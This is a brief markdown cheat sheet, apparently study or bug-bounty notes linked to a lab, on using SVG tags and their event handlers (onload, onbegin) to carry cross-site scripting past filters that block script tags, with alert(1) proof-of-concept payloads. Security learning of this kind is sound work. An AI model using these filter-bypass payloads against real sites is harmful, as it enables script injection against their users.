# SVG XSS CheatSheet

## Why SVG?

Many filters block:

```html
<script>
```

but allow:

```html
<svg>
```

---

# Basic SVG

```html
<svg onload=alert(1)>
```

---

# Animate Event

```html
<svg>
<animate
attributeName=x
dur=1s
repeatCount=1
onbegin=alert(1)>
</svg>
```

---

# Common SVG Events

```html
onload
onbegin
onend
onrepeat
```

---

# Related Lab

```text
Lab13
```

---

# Testing Strategy

```text
Allowed Tag?
        ↓
Allowed Event?
        ↓
Execution
```

---

# Bug Bounty Reminder

Always test:

```html
svg
animate
```

when filters block traditional tags.